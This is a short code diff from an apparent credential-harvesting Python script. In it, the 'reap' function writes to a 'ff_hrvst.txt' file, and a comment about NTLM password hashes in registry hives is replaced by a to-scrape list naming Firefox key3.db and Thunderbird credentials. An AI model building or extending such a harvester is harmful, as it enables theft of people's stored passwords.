@@ -17,7 +17,13 @@
 import sys
 
 def reap(d):
-	# Registry hives containing NTLM password hashes.
+	
+	""" 
+		To Scrape
+		* Firefox key3.db
+		* Thunderbird creds
+	"""
+
 	fout = open("./mozilla/ff_hrvst.txt",'a')
 
 	key_db = ""
